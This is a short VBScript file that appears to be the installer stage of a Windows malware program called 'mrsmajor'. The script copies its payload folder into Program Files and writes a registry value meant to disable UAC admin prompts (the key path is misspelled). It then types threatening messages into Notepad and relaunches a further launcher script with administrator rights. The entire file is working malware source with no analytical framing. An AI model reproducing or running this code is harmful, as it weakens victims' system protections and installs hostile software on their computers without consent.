set x = createobject("Wscript.shell")
set c = createobject("Scripting.filesystemobject")
set objShell=createobject("Shell.Application")
on error resume next
if c.FolderExists("C:\Program files\mrsmajor") then
msgbox"Only 1 time",1+16,"Meh.."
else
dim tmp : tmp=x.expandenvironmentstrings("%TEMP%")
dim dsk : dsk=x.specialfolders("DESKTOP")
c.CopyFolder"mrsmajor", "C:\Program Files\"
x.RegWrite"HKLM\SOFWTARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin","0","REG_DWORD"
x.run "notepad.exe"
wscript.sleep 200
x.sendkeys"Start to CRY!"
x.sendkeys"{ENTER}WHAT I WANT FROM YOU IS DoNT'scxhcar__?-#+-__3871h--____....."
wscript.sleep 2000
x.sendkeys"DONT CLICK ANYTHING!{ENTER}                                             =Created By BeRkaY_the_Coder (Elektro Berkay)= "

wscript.sleep 2000


dim buhu
 buhu="C:\Program files\mrsmajor\mrsmajorlauncher.vbs" 
 ObjShell.ShellExecute "wscript.exe", """" & buhu & """ RunAsAdministrator", , "runas", 1  
end if